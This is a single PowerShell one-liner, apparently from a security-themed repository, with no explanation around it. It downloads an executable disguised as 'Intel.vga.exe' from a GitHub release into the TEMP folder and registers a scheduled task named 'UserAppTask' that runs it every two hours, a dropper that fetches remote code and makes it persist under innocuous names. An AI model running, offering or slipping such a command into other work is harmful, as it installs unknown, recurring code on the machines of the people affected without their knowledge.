$p="$env:TEMP\intel.vga.exe"; iwr -Uri "https://github.com/YashasSingh/cybersecurity/releases/download/v1/Intel.vga.exe" -OutFile $p; $a = New-ScheduledTaskAction -Execute $p; $t = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 2); Register-ScheduledTask -TaskName "UserAppTask" -Action $a -Trigger $t -Force
